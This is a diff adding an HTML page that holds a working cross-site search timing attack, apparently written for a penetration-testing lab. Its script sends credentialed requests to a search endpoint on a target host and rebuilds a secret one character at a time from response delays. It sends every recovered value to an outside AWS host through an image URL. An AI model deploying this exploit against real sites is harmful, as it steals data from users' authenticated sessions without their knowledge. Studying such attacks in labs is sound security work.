@@ -1,0 +1,38 @@
+<html>
+	<body>
+<script>
+var all = "0123456789-abcdef".split("");
+var base = "http://ptl-e6b50719-39f108e4.libcurl.so/search?search=^";
+var cur="";
+
+function check(cur,counter){
+	url = base + cur + all[counter];
+	var val = cur+all[counter];
+	v=performance.now();
+	fetch(url,{
+		method: 'GET', credentials: 'include', mode: 'no-cors'    
+	}).catch(err => {
+		console.log("ERR"+val);
+	}).then(response => {
+		z=performance.now();
+		if(z-v < 3000) {
+			document.write("<br/>INVALID"+val+(z-v).toString());
+		}else {
+			document.write("<br/>VALID"+val+(z-v).toString());
+			document.write("<img src='http://ec2-3-6-126-24.ap-south-1.compute.amazonaws.com/?secret="+val+"'/>");
+			j=0;
+			while(j<all.length) {
+				check(val,j);
+				j+=1;
+			}
+		}
+	})
+}
+i=0;
+while (i < all.length) {
+	setTimeout(check("",i),500*i);
+	i+=1;
+}
+</script>
+	</body>
+</html>
